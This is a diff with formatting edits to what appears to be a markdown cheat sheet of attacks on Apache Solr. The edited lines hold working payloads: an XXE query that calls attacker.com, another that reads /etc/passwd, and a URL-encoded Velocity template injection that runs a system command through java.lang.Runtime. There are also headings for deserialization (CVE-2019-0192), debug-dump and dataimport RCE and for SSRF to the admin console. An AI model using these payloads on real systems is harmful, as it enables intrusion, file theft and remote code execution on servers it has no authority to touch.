@@ -28,6 +28,7 @@ Get replication info for a core:
 
 ```
 /solr/<core>/replication?command=indexversion
+
 /solr/<core>/replication?command=details
 ```
 
@@ -84,10 +85,12 @@ SSRFs can be used to access the internal admin console at `127.0.0.1:8983`.
 ```
 
 ## XXE
+
 ### Query XXE
 
 ```
 /solr/<core>/select?fq={!xmlparser v='<!DOCTYPE a SYSTEM "https://attacker.com"><a></a>'}
+
 /solr/<core>/select?fq={!xmlparser v='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}
 ```
 
@@ -98,6 +101,7 @@ SSRFs can be used to access the internal admin console at `127.0.0.1:8983`.
 ```
 
 ## RCE
+
 ### RCE via debug dump 
 
 1. 
@@ -139,7 +143,7 @@ Content-Length: 213
 ```
 2. 
 ```
-`/solr/core/update?commit=true`
+/solr/core/update?commit=true
 ```
 
 ### \[CVE-2019-0192\] RCE via deserialization
@@ -181,7 +185,7 @@ Content-Length: 259
 ```
 2. 
 ```
-`/solr/<core>/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end`
+/solr/<core>/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
 ```
 
 ### RCE via dataimport
